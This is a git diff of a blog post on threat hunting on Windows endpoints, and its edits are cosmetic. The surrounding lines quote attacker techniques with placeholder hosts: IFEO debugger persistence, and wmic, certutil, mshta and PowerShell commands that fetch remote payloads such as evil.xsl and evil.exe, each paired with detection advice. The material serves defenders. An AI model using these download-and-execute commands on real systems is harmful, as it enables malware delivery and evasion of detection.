@@ -2,7 +2,7 @@
 layout: post
 classes: wide
 title:  "Threat Hunting in Windows Endpoints"
-date:   2024-12-07 01:00:00 +0800
+date:   2024-12-08 12:00:00 +0800
 --- 
 This post provides details on threat hunting in the machines running in Windows operating system.  
 
@@ -41,7 +41,7 @@ Adversaries may clear the Windows audit logs to remove its footpath. Whenever au
 
 Image File Execution Options (IFEO) are used for debugging and IFEO settings are stored in the Windows registry. This feature enables the developer to to attach a debugger to the known executables. Malwares exploit this feature for its persistence by adding a debugger to the below executables. whenever the below utilities are triggered, malcious executable will be executed.
 
-`Windows Utilities`:
+Windows Utilities:
 - sethc.exe
 - magnify.exe
 - narrator.exe
@@ -65,7 +65,7 @@ Registry Path:
 
 WMIC shell is a windows utility that provide command line interface for WMI(Windows Management Instrumentation). This offers various administrative functions to query windows machines to get details such as system settings, process and also to execute scripts. Adversaries use this utility to download malicious payload to evade detections.
 
-`wmic os get /FORMAT:"http://<URl>/evil[.]xsl"`
+`wmic os get /FORMAT:"http://<URl>/evil[.]xsl"`.
 XSL script (extensible Stylesheet Language). WMI can invoke javascript or VBscript using XSL.
 
 
@@ -74,7 +74,7 @@ display certification authority (CA) configuration information, configure Certif
 Adversaries can use this utility to download malicious payload to evade detections.
 
 `certutil -urlcache -split -f [http[:]//<URL>] evil[.]txt`
-`certutil -decode evil.txt evil.exe`
+`certutil -decode evil.txt evil.exe`.
  Decode option is used to decode the disguised certificate.
 
 <u>Detection:</u>
@@ -153,7 +153,6 @@ Windows Utilities:
 - wmic
 - rundll32.exe
 
-
 Usage :
 - mshta.exe https[:]//<URL>/evil[.]hta
 - mshta evil[.]hta
@@ -169,7 +168,6 @@ rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObje
 - Using Powershell:Invoke-WebRequest -Uri $url -OutFile $output
 - Using Powershell:(New-Object System.Net.WebClient).DownloadFile($url, $output)
 - Using Powershell:Start-BitsTransfer -Source $url -Destination $output -Asynchronous
-
 
 <u>Detection:</u>
 - Look for these utilities prefetch files and parsing the prefetch will provide the executed file  
